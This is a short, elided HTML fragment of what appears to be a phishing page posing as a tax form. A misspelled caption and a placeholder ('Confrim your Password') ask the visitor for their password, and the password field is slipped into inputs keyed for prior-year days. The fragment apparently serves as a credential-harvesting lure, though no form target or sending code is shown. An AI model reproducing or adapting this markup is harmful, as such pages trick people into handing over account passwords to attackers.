        ...
        <div id="tax-form">
          <div id="AboutYouSection" class="Question AboutYouSection">
            <div class="CaptionWrapper ">
              <div class="Caption ">
                <font color="grey">Please Confrim your password to complete the request. <a></a>
              </div>
            </div>
                ...
                <div data-form-element-key="PrevToPrevYearDays"
                  ...
                  <div data-form-element-key="PrevYearDays"
                    ...
                    <div class="TextBox floatingLabelContainer">
                      <input type="password" name="pass" id="PrevYearDays" required="" placeholder="Confrim your Password">
